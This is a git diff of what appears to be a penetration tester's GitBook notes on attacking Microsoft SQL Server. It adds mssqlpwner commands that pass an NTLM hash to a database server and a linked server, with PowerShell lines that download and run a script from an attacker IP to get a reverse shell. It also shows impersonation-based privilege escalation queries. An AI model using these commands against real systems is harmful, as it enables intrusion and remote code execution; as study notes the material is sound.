@@ -4,11 +4,26 @@
 
 <summary>Connecting to MSSQL</summary>
 
+### Mssqlclient
+
 ```sh
-/usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.62.217 -windows-auth
+impacket-mssqlclient ARCHETYPE/sql_svc@10.129.62.217 -windows-auth
 ```
 
 * May not need `-windows-auth`
+
+### Mssqlpwner
+
+<pre class="language-powershell"><code class="lang-powershell">mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth interactive
+# To obtain reverse shell from DB01
+# exec "powershell.exe -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
+<strong>
+</strong><strong># To find linked servers
+</strong><strong># get-link-server-list 
+</strong><strong>
+</strong><strong># To obtain reverse shell from DB02 (linked server)
+</strong># mssqlpwner 'cowmotors-int.com/WEB01$'@db01 -hashes :b14a97aa629098c1d9a4819641f0fdad -windows-auth -link-name DB02 exec "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')
+</code></pre>
 
 ```bash
 sqsh -S <server’s ip> -U <username> -P <password>
@@ -190,19 +205,19 @@ Follow guide [here](https://hex64.net/blog/how-to-recover-sa-password-on-microso
 
 1. Go to Sql Server Configuration Manager
 
-![](<../.gitbook/assets/image (1) (1).png>)
+![](<../.gitbook/assets/image (1) (1) (1).png>)
 
 2. Stop the SQL server
 
-![](<../.gitbook/assets/image (1) (1) (1).png>)
+![](<../.gitbook/assets/image (1) (1) (1) (1).png>)
 
 3. Right click --> Properties
 
-![](<../.gitbook/assets/image (2).png>)
+![](<../.gitbook/assets/image (2) (1).png>)
 
 4. Add startup parameter "-m" --> apply --> ok
 
-![](<../.gitbook/assets/image (3).png>)
+![](<../.gitbook/assets/image (3) (1).png>)
 
 5. Restart the server
 
@@ -501,7 +516,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 <summary>Privilege Escalation</summary>
 
-* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png>)
+* Enumerate which logins allow impersonation ![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
   *   ```csharp
       String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
       SqlCommand command = new SqlCommand(query, con);
@@ -517,7 +532,7 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
 * Impersonate "sa" using EXECUTE AS LOGIN&#x20;
   * Impersonates a server-level login.
-  * ![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
+  * ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
   *   ```csharp
       String querylogin = "SELECT SYSTEM_USER;";
       SqlCommand command = new SqlCommand(querylogin, con);
